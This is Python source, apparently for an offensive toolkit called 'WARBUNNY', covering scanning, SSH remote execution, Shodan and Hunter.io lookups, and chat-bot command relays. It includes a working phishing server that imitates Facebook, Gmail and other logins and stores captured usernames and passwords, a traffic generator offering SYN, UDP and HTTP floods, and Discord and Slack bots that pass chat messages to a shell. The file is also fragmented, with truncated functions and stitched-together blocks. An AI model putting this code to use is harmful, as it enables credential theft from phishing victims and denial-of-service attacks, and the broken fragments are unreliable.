class DatabaseManager:

    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self._init_tables()

    # ==================== Core Database Methods ====================
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_time_command(self, command: str, user: str = "system", result: str = ""):
        try:
            self.cursor.execute('''
                INSERT INTO time_history (command, user, result, timestamp)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (command, user, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str, action_taken: str = "Logged"):
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?)
            ''', (threat_type, source_ip, severity, description, action_taken))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_scan(self, target: str, scan_type: str, open_ports: List[Dict], execution_time: float = 0.0):
        try:
            open_ports_json = json.dumps(open_ports)
            self.cursor.execute('''
                INSERT INTO scans (target, scan_type, open_ports, execution_time)
                VALUES (?, ?, ?, ?)
            ''', (target, scan_type, open_ports_json, execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], scan_time: float, output_file: str, success: bool):
        try:
            vulns_json = json.dumps(vulnerabilities)
            self.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, vulns_json, output_file, scan_time, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def log_shodan_result(self, ip: str, ports: List[int], hostnames: List[str], country: str, city: str, org: str, os_info: str, vulnerabilities: List[str], raw_data: Dict):
        try:
            ports_json = json.dumps(ports)
            hostnames_json = json.dumps(hostnames)
            vulns_json = json.dumps(vulnerabilities)
            raw_json = json.dumps(raw_data)
            self.cursor.execute('''
                INSERT OR REPLACE INTO shodan_results (ip, ports, hostnames, country, city, org, os, vulnerabilities, raw_data)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (ip, ports_json, hostnames_json, country, city, org, os_info, vulns_json, raw_json))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Shodan result: {e}")
    
    def log_hunter_result(self, domain: str, emails: List[Dict], total: int, pattern: str, organization: str, raw_data: Dict):
        try:
            emails_json = json.dumps(emails)
            raw_json = json.dumps(raw_data)
            self.cursor.execute('''
                INSERT OR REPLACE INTO hunter_results (domain, emails, total_emails, pattern, organization, raw_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (domain, emails_json, total, pattern, organization, raw_json))
            self.conn.commit()

# ENCRYPTION MANAGER
# =====================
class EncryptionManager:
    def __init__(self):
        self.key_file = os.path.join(CONFIG_DIR, ".key")
        self.key = self._get_or_create_key()
    
    def _get_or_create_key(self) -> bytes:
        if not CRYPTO_AVAILABLE:
            return None
        try:
            from cryptography.fernet import Fernet
            if os.path.exists(self.key_file):
                with open(self.key_file, 'rb') as f:
                    return f.read()
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
            return key
        except:
            return None
    
    def encrypt(self, data: str) -> str:
        if not data or not CRYPTO_AVAILABLE or not self.key:
            return data
        try:
            from cryptography.fernet import Fernet
            f = Fernet(self.key)
            return f.encrypt(data.encode()).decode()
        except:
            return data
    
    def decrypt(self, data: str) -> str:
        if not data or not CRYPTO_AVAILABLE or not self.key:
            return data
        try:
            from cryptography.fernet import Fernet
            f = Fernet(self.key)
            return f.decrypt(data.encode()).decode()
        except:
            return data

class CommandExecutor:
    """Execute system commands with security"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def execute(self, command: str, source: str = "local", timeout: int = 300) -> Dict[str, Any]:
        start_time = time.time()
        
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True,
                timeout=timeout, encoding='utf-8', errors='ignore'
            )
            execution_time = time.time() - start_time
            success = result.returncode == 0
            output = result.stdout if result.stdout else result.stderr
            
            self.db.log_command(command, source, success, output[:5000], execution_time)
            
            # Detect scan type
            if any(cmd in command for cmd in ['nmap', 'scan', 'nikto', 'shodan', 'hunter']):
                self._log_scan_result(command, output, execution_time)
            
            return {
                'success': success,
                'output': output,
                'execution_time': execution_time,
                'command': command
            }
        except subprocess.TimeoutExpired:
            execution_time = time.time() - start_time
            self.db.log_command(command, source, False, "Command timed out", execution_time)
            return {'success': False, 'output': f"Command timed out after {timeout}s", 'execution_time': execution_time}
        except Exception as e:
            execution_time = time.time() - start_time
            self.db.log_command(command, source, False, str(e), execution_time)
            return {'success': False, 'output': str(e), 'execution_time': execution_time}
    
    def _log_scan_result(self, command: str, output: str, execution_time: float):
        target = self._extract_target(command)
        scan_type = self._extract_scan_type(command)
        open_ports = self._parse_nmap_ports(output)
        self.db.log_scan(target, scan_type, open_ports, execution_time)
    
    def _extract_target(self, command: str) -> str:
        words = command.split()
        for word in words:
            if '.' in word and not word.startswith('-') and not word.startswith('http'):
                return word
        return "unknown"
    
    def _extract_scan_type(self, command: str) -> str:
        if '-sS' in command: return "SYN Scan"
        if '-sT' in command: return "TCP Connect"
        if '-sU' in command: return "UDP Scan"
        if '-sV' in command: return "Version Detection"
        if '-O' in command: return "OS Detection"
        if '-A' in command: return "Aggressive Scan"
        if '--script vuln' in command: return "Vulnerability Scan"
        if 'nikto' in command: return "Nikto Web Scan"
        if 'shodan' in command: return "Shodan Search"
        return "Standard Scan"
    
    def _parse_nmap_ports(self, output: str) -> List[Dict]:
        open_ports = []
        for line in output.split('\n'):
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 3 and parts[1] == 'open':
                    port_proto = parts[0].split('/')
                    if len(port_proto) == 2:
                        open_ports.append({
                            'port': int(port_proto[0]),
                            'protocol': port_proto[1],
                            'service': parts[2] if len(parts) > 2 else 'unknown'
                        })
        return open_ports

class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
        self.encryption = EncryptionManager()
        self.paramiko_available = PARAMIKO_AVAILABLE
    
    def is_available(self) -> bool:
        return self.paramiko_available
    
    def add_connection(self, name: str, host: str, username: str, password: str = None, key_path: str = None, port: int = 22) -> Dict[str, Any]:
        conn_id = str(uuid.uuid4())[:8]
        encrypted_password = self.encryption.encrypt(password) if password else None
        if self.db.save_ssh_connection(conn_id, name, host, port, username, encrypted_password, key_path):
            return {'success': True, 'id': conn_id, 'message': f"SSH connection '{name}' added"}
        return {'success': False, 'error': "Failed to save connection"}
    
    def connect(self, conn_id: str) -> Dict[str, Any]:
        if not self.paramiko_available:
            return {'success': False, 'error': "Paramiko not installed"}
        
        conn = self.db.get_ssh_connection(conn_id)
        if not conn:
            return {'success': False, 'error': "Connection not found"}
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn['host'],
                'port': conn['port'],
                'username': conn['username'],
                'timeout': 30
            }
            
            if conn['password_encrypted']:
                connect_kwargs['password'] = self.encryption.decrypt(conn['password_encrypted'])
            elif conn['key_path'] and os.path.exists(conn['key_path']):
                connect_kwargs['key_filename'] = conn['key_path']
            else:
                return {'success': False, 'error': "No authentication method"}
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            self.db.update_ssh_status(conn_id, 'connected')
            return {'success': True, 'message': f"Connected to {conn['name']}"}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def disconnect(self, conn_id: str = None):
        if conn_id and conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
                self.db.update_ssh_status(conn_id, 'disconnected')
            except:
                pass
        elif conn_id is None:
            for cid in list(self.connections.keys()):
                try:
                    self.connections[cid].close()
                    self.db.update_ssh_status(cid, 'disconnected')
                except:
                    pass
            self.connections.clear()
    
    def execute(self, conn_id: str, command: str) -> Dict[str, Any]:
        if conn_id not in self.connections:
            connect_result = self.connect(conn_id)
            if not connect_result['success']:
                return connect_result
        
        start_time = time.time()
        try:
            client = self.connections[conn_id]
            stdin, stdout, stderr = client.exec_command(command, timeout=30)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            execution_time = time.time() - start_time
            
            cmd_id = str(uuid.uuid4())[:8]
            self.db.save_ssh_command(cmd_id, conn_id, command, output + error, exit_code, execution_time, exit_code == 0)
            
            return {'success': exit_code == 0, 'output': output + error, 'execution_time': execution_time}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def get_connections(self) -> List[Dict]:
        return self.db.get_all_ssh_connections()
    
    def get_status(self) -> Dict:
        return {'active': len(self.connections), 'connections': list(self.connections.keys())}

    def generate_phishing_link(self, platform: str, custom_url: str = None, custom_template: str = None) -> Dict[str, Any]:
        link_id = str(uuid.uuid4())[:8]
        templates = self.db.get_phishing_templates(platform)
        html_content = custom_template or (templates[0]['html_content'] if templates else self.db._get_custom_template())
        
        phishing_url = f"http://{self._get_local_ip()}:8080/{link_id}"
        self.db.save_phishing_link(link_id, platform, custom_url or f"https://www.{platform}.com", phishing_url, platform, datetime.datetime.now().isoformat())
        self.active_links[link_id] = {'platform': platform, 'html': html_content, 'created': datetime.datetime.now()}
        
        return {'success': True, 'link_id': link_id, 'platform': platform, 'phishing_url': phishing_url}
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        
        class PhishingHandler(BaseHTTPRequestHandler):
            server_instance = None
            def log_message(self, format, *args): pass
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(self.server_instance.html_content.encode('utf-8'))
                    if self.server_instance.db and self.server_instance.link_id:
                        self.server_instance.db.update_phishing_clicks(self.server_instance.link_id)
                else:
                    self.send_response(404)
                    self.end_headers()
            def do_POST(self):
                if self.path == '/capture':
                    content_length = int(self.headers.get('Content-Length', 0))
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    form_data = urllib.parse.parse_qs(post_data)
                    username = form_data.get('username', form_data.get('email', ['']))[0]
                    password = form_data.get('password', [''])[0]
                    client_ip = self.client_address[0]
                    user_agent = self.headers.get('User-Agent', 'Unknown')
                    if self.server_instance.db and self.server_instance.link_id:
                        self.server_instance.db.save_captured_credential(self.server_instance.link_id, username, password, client_ip, user_agent, '')
                    self.send_response(302)
                    self.send_header('Location', 'https://www.google.com')
                    self.end_headers()
        
        try:
            import socketserver
            handler = PhishingHandler
            handler.server_instance = self
            handler.server_instance.db = self.db
            handler.server_instance.link_id = link_id
            handler.server_instance.html_content = self.active_links[link_id]['html']
            
            self.phishing_server = socketserver.TCPServer(('0.0.0.0', port), handler)
            threading.Thread(target=self.phishing_server.serve_forever, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop_phishing_server(self):
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_server_url(self) -> str:
        return f"http://{self._get_local_ip()}:8080" if self.phishing_server else None
    
    def get_active_links(self) -> List[Dict]:
        return [{'link_id': k, 'platform': v['platform'], 'created': v['created'].isoformat()} for k, v in self.active_links.items()]
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:

    def generate_qr_code(self, link_id: str) -> Optional[str]:

class TrafficGenerator:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.active = {}
        self.stop_events = {}
    
    def get_types(self) -> List[str]:
        types = ['icmp', 'tcp_syn', 'tcp_ack', 'udp', 'http_get', 'http_post', 'dns', 'arp', 'ping']
        if self.scapy_available:
            types.extend(['syn_flood', 'udp_flood', 'http_flood', 'mixed', 'random'])
        return types
    
    def generate(self, traffic_type: str, target_ip: str, duration: int, port: int = None, rate: int = 100) -> Dict[str, Any]:
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        try:
            ipaddress.ip_address(target_ip)
            if port is None:
                if traffic_type in ['http_get', 'http_post', 'http_flood']: port = 80
                elif traffic_type in ['dns']: port = 53
                else: port = 0
            
            stop_event = threading.Event()
            self.stop_events[generator_id] = stop_event
            
            generator = {
                'id': generator_id, 'type': traffic_type, 'target_ip': target_ip,
                'target_port': port, 'duration': duration, 'rate': rate,
                'start_time': datetime.datetime.now().isoformat(), 'status': 'running',
                'packets_sent': 0, 'bytes_sent': 0
            }
            
            threading.Thread(target=self._run, args=(generator_id, generator, stop_event), daemon=True).start()
            self.active[generator_id] = generator
            self.db.log_traffic(traffic_type, target_ip, port, duration, 0, 0, 'running', 'system', None)
            return {'success': True, 'generator_id': generator_id, 'message': f"Started {traffic_type} to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _run(self, generator_id: str, generator: Dict, stop_event: threading.Event):
        end_time = time.time() + generator['duration']
        delay = 1.0 / max(1, generator['rate'])
        packets_sent = 0
        bytes_sent = 0
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = self._send_packet(generator['type'], generator['target_ip'], generator['target_port'])
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(delay)
            except:
                time.sleep(delay)
        
        generator['packets_sent'] = packets_sent
        generator['bytes_sent'] = bytes_sent
        generator['status'] = 'completed' if not stop_event.is_set() else 'stopped'
        self.db.log_traffic(generator['type'], generator['target_ip'], generator['target_port'], generator['duration'], packets_sent, bytes_sent, generator['status'], 'system', None)
        if generator_id in self.active: del self.active[generator_id]
        if generator_id in self.stop_events: del self.stop_events[generator_id]
    
    def _send_packet(self, traffic_type: str, target_ip: str, port: int) -> int:
        if traffic_type == 'icmp':
            return self._send_icmp(target_ip)
        elif traffic_type == 'tcp_syn':
            return self._send_tcp_syn(target_ip, port)
        elif traffic_type == 'udp':
            return self._send_udp(target_ip, port)
        elif traffic_type == 'http_get':
            return self._send_http_get(target_ip, port)
        elif traffic_type == 'dns':
            return self._send_dns(target_ip, port)
        elif traffic_type == 'arp' and self.scapy_available:
            return self._send_arp(target_ip)
        else:
            return self._send_ping(target_ip)
    
    def _send_icmp(self, target_ip: str) -> int:
        try:
            if platform.system().lower() == 'windows':
                subprocess.run(f"ping -n 1 -w 1000 {target_ip}", shell=True, capture_output=True, timeout=2)
            else:
                subprocess.run(f"ping -c 1 -W 1 {target_ip}", shell=True, capture_output=True, timeout=2)
            return 64
        except:
            return 0
    
    def _send_tcp_syn(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect_ex((target_ip, port))
            sock.close()
            return 60
        except:
            return 0
    
    def _send_udp(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'X' * 64, (target_ip, port))
            sock.close()
            return 72
        except:
            return 0
    
    def _send_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request('GET', '/', headers={'User-Agent': 'Warbunny'})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + questions + b'\x00\x00\x00\x00' + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _send_arp(self, target_ip: str) -> int:
        try:
            from scapy.all import Ether, ARP, sendp
            packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _send_ping(self, target_ip: str) -> int:
        return self._send_icmp(target_ip)
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id and generator_id in self.stop_events:
            self.stop_events[generator_id].set()
            return True
        elif generator_id is None:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return list(self.active.values())
    
    def get_types_help(self) -> str:
        return """Available Traffic Types:
  icmp      - ICMP echo requests
  tcp_syn   - TCP SYN packets
  udp       - UDP packets
  http_get  - HTTP GET requests
  http_post - HTTP POST requests
  dns       - DNS queries
  arp       - ARP requests (requires scapy)
  ping      - Ping flood
  syn_flood - SYN flood (requires scapy)
  udp_flood - UDP flood (requires scapy)
  mixed     - Mixed traffic types

class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict:
        try:
            if platform.system().lower() == 'windows':
                result = subprocess.run(f"ping -n {count} {target}", shell=True, capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(f"ping -c {count} {target}", shell=True, capture_output=True, text=True, timeout=30)
            return {'success': True, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def nmap(target: str, options: str = "") -> Dict:
        try:
            result = subprocess.run(f"nmap {options} {target}", shell=True, capture_output=True, text=True, timeout=300)
            return {'success': result.returncode == 0, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def curl(url: str, options: str = "") -> Dict:
        try:
            result = subprocess.run(f"curl -s {options} {url}", shell=True, capture_output=True, text=True, timeout=30)
            return {'success': result.returncode == 0, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def wget(url: str, options: str = "") -> Dict:
        try:
            result = subprocess.run(f"wget {options} {url}", shell=True, capture_output=True, text=True, timeout=300)
            return {'success': result.returncode == 0, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def nc(host: str, port: int, options: str = "") -> Dict:
        try:
            result = subprocess.run(f"nc {options} {host} {port}", shell=True, capture_output=True, text=True, timeout=10)
            return {'success': result.returncode == 0, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def whois(domain: str) -> Dict:
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': "WHOIS not available"}
        try:
            import whois
            result = whois.whois(domain)
            return {'success': True, 'output': str(result)}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def dig(domain: str, record_type: str = "A") -> Dict:
        try:
            result = subprocess.run(f"dig {domain} {record_type} +short", shell=True, capture_output=True, text=True, timeout=10)
            return {'success': True, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def traceroute(target: str) -> Dict:
        try:
            if platform.system().lower() == 'windows':
                result = subprocess.run(f"tracert -d {target}", shell=True, capture_output=True, text=True, timeout=60)
            else:
                result = subprocess.run(f"traceroute -n {target}", shell=True, capture_output=True, text=True, timeout=60)
            return {'success': True, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {'success': True, 'country': data.get('country'), 'city': data.get('city'), 'isp': data.get('isp')}
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'

                return WEB_DASHBOARD

                stats = self.db.get_statistics()

                stats['telegram'] = False
                stats['whatsapp'] = False
                stats['signal'] = False
                stats['slack'] = False
                return jsonify(stats)

            def execute_api():
                data = request.json
                command = data.get('command', '')
                result = self.handler.execute(command, 'web')
                return jsonify(result)
            
            @app.websocket('/ws')
            def websocket_handler(ws):
                self.websocket_clients.append(ws)
                try:
                    while True:
                        ws.receive()

                    self.websocket_clients.remove(ws)

            return True
        except Exception as e:
            logger.error(f"Failed to start web dashboard: {e}")
            return False

        for ws in self.websocket_clients[:]:
            try:
                ws.send(json.dumps(message))
            except:
                self.websocket_clients.remove(ws)

            return False

        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.GREEN}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord')
                output = result.get('output', '')[:1900]
                embed = discord.Embed(
                    title="🐰 WARBUNNY Response",
                    description=f"```{output}```",
                    color=discord.Color.green()
                )
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            threading.Thread(target=self._run, daemon=True).start()

        try:
            self.bot.run(self.config['token'])

        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack')
                                self.client.chat_postMessage(
                                    channel=channel,

                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)

        self.api = None
        self.available = SHODAN_AVAILABLE and self.api_key
        
        if self.available:
            try:
                self.api = shodan.Shodan(self.api_key)
            except Exception as e:
                logger.error(f"Failed to initialize Shodan: {e}")
                self.available = False
    
    def is_available(self) -> bool:
        return self.available
    
    def search_ip(self, ip: str) -> Dict[str, Any]:
        if not self.available:
            return {'success': False, 'error': 'Shodan not configured'}
        try:
            result = self.api.host(ip)
            ports = result.get('ports', [])
            hostnames = result.get('hostnames', [])
            country = result.get('country_name', 'Unknown')
            city = result.get('city', 'Unknown')
            org = result.get('org', 'Unknown')
            os_info = result.get('os', 'Unknown')
            vulnerabilities = list(result.get('vulns', {}).keys())
            self.db.log_shodan_result(ip, ports, hostnames, country, city, org, os_info, vulnerabilities, result)
            return {'success': True, 'ip': ip, 'ports': ports, 'hostnames': hostnames, 'country': country, 'city': city, 'org': org, 'os': os_info, 'vulnerabilities': vulnerabilities}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def search(self, query: str, limit: int = 10) -> Dict[str, Any]:
        if not self.available:
            return {'success': False, 'error': 'Shodan not configured'}
        try:
            results = []
            for result in self.api.search(query, limit=limit):
                results.append(result)
            return {'success': True, 'query': query, 'total': len(results), 'results': results[:10]}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_stats(self) -> Dict[str, Any]:
        if not self.available:
            return {'available': False}
        try:
            info = self.api.info()
            return {'available': True, 'scan_credits': info.get('scan_credits', 0), 'query_credits': info.get('query_credits', 0)}
        except:
            return {'available': True}

        return self.available
    
    def scan(self, target: str, options: Dict = None) -> Dict[str, Any]:
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        options = options or {}
        start_time = time.time()
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'): cmd.append('-ssl')
            if options.get('port'): cmd.extend(['-port', str(options['port'])])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=options.get('timeout', 600))
            scan_time = time.time() - start_time
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        vulnerabilities = data.get('vulnerabilities', []) if isinstance(data, dict) else data
                except: pass
            self.db.log_nikto_scan(target, vulnerabilities, scan_time, output_file, result.returncode == 0)
            return {'success': True, 'target': target, 'vulnerabilities': vulnerabilities, 'count': len(vulnerabilities), 'scan_time': scan_time, 'output_file': output_file}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Help command
        if cmd in ['help', '?']:
            result = self._help()
        
        # Time commands
        elif cmd in ['time', '!time']:
            result = {'success': True, 'output': self.time.get_time('full' in args)}
        elif cmd in ['date', '!date']:
            result = {'success': True, 'output': self.time.get_date('full' in args)}
        elif cmd in ['datetime', 'now']:
            result = {'success': True, 'output': self.time.get_datetime()}
        elif cmd == 'history':
            result = self._history(args)
        elif cmd == 'time_history':
            result = self._time_history(args)
        
        # System commands
        elif cmd == 'status':
            result = self._status()
        elif cmd == 'system':
            result = self._system()
        elif cmd == 'report':
            result = self._report()
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            result = {'success': True, 'output': ''}
        elif cmd == 'exit':
            result = {'success': True, 'output': 'exit'}
        
        # Network commands
        elif cmd == 'ping':
            result = self.network.ping(args[0] if args else '8.8.8.8')
        elif cmd == 'traceroute':
            result = self.network.traceroute(args[0] if args else 'google.com')
        elif cmd == 'whois':
            result = self.network.whois(args[0] if args else '')
        elif cmd == 'dns':
            result = self.network.dig(args[0] if args else 'google.com')
        elif cmd == 'location':
            result = self.network.get_ip_location(args[0] if args else '8.8.8.8')
        
        # Scan commands
        elif cmd == 'scan':
            result = self._scan(args)
        elif cmd == 'nmap':
            result = self.network.nmap(args[0] if args else '', ' '.join(args[1:]))
        elif cmd == 'nikto':
            result = self.nikto.scan(args[0] if args else '')
        
        # SSH commands
        elif cmd == 'ssh_add':
            result = self.ssh.add_connection(*args) if len(args) >= 3 else {'success': False, 'output': 'Usage: ssh_add <name> <host> <user> [password] [port]'}
        elif cmd == 'ssh_list':
            conns = self.ssh.get_connections()
            result = {'success': True, 'output': f"SSH Connections:\n" + "\n".join([f"  {c['name']} - {c['host']}:{c['port']}" for c in conns]) or "No connections"}
        elif cmd == 'ssh_connect':
            result = self.ssh.connect(args[0]) if args else {'success': False, 'output': 'Usage: ssh_connect <id>'}
        elif cmd == 'ssh_exec':
            result = self.ssh.execute(args[0], ' '.join(args[1:])) if len(args) >= 2 else {'success': False, 'output': 'Usage: ssh_exec <id> <command>'}
        elif cmd == 'ssh_disconnect':
            self.ssh.disconnect(args[0] if args else None)
            result = {'success': True, 'output': 'Disconnected'}
        
        # Shodan commands
        elif cmd == 'shodan_ip':
            result = self.shodan.search_ip(args[0] if args else '')
        elif cmd == 'shodan_search':
            result = self.shodan.search(' '.join(args)) if args else {'success': False, 'output': 'Usage: shodan_search <query>'}
        
        # Hunter.io commands
        elif cmd == 'hunter_domain':
            result = self.hunter.domain_search(args[0] if args else '')
        
        # Traffic commands
        elif cmd == 'traffic':
            if len(args) >= 3:
                traffic_type = args[0]
                target_ip = args[1]
                duration = int(args[2])
                port = int(args[3]) if len(args) > 3 else None
                rate = int(args[4]) if len(args) > 4 else 100
                result = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            else:
                result = {'success': False, 'output': self.traffic.get_types_help()}
        elif cmd == 'traffic_stop':
            result = {'success': self.traffic.stop(args[0] if args else None), 'output': 'Stopped' if self.traffic.stop(args[0] if args else None) else 'Failed'}
        elif cmd == 'traffic_status':
            active = self.traffic.get_active()
            result = {'success': True, 'output': f"Active generators: {len(active)}\n" + "\n".join([f"  {g['type']} -> {g['target_ip']}:{g['target_port']} ({g['packets_sent']} packets)" for g in active])}
        
        # Phishing commands
        elif cmd in ['phish_facebook', 'phish_instagram', 'phish_twitter', 'phish_gmail', 'phish_linkedin']:
            platform = cmd.replace('phish_', '')
            result = self.social.generate_phishing_link(platform)
        elif cmd == 'phish_custom':
            result = self.social.generate_phishing_link('custom', args[0] if args else None)
        elif cmd == 'phish_start':
            result = self.social.start_phishing_server(args[0] if args else '', int(args[1]) if len(args) > 1 else 8080)
            if result: result = {'success': True, 'output': f"Phishing server started at {self.social.get_server_url()}"}
            else: result = {'success': False, 'output': 'Failed to start server'}
        elif cmd == 'phish_stop':
            self.social.stop_phishing_server()
            result = {'success': True, 'output': 'Phishing server stopped'}
        elif cmd == 'phish_status':
            url = self.social.get_server_url()
            result = {'success': True, 'output': f"Phishing server: {'Running' if url else 'Stopped'}" + (f" at {url}" if url else '')}
        elif cmd == 'phish_links':
            links = self.social.get_active_links()
            result = {'success': True, 'output': f"Active links:\n" + "\n".join([f"  {l['link_id']} - {l['platform']}" for l in links])}
        elif cmd == 'phish_creds':
            creds = self.social.get_captured_credentials(args[0] if args else None)
            result = {'success': True, 'output': f"Captured credentials:\n" + "\n".join([f"  {c['username']}:{c['password']} from {c['ip_address']}" for c in creds[:10]])}
        elif cmd == 'phish_qr':
